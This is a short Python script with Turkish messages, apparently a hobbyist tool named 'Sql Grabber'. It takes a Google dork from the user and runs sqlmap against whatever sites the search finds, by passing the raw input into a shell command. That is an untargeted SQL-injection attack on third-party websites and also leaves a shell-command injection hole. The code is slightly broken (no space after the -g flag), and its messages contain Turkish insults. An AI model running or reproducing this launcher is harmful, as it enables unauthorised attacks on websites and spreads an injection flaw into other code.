import requests
import re
import os
import sys
import time
from sys import platform as _platform
from colorama import Fore, Back, Style
banner = ("""


Coded by Athena
""")
print(banner)
if _platform == "win32" or _platform == "win64":
    	        os.system("cls")
    	        time.sleep(5)
    	        print(Fore.RED)
    	        print("Programım windows'da çalışmaz diye kaç kere dicem angut !")
    	        sys.exit(1)
if _platform == "linux" or _platform == "linux2":
	os.system("clear")
	print(Fore.YELLOW)
	print("Sql Grabber Programıma hoşgeldiniz !")
	dork = input("Dorkun nedir : ")
	os.system("sqlmap -g"+dork)
	if dork == "Sanane":
		print(Fore.BLUE)
		print("Kes sikik")
		time.sleep(3)
		sys.exit(1)
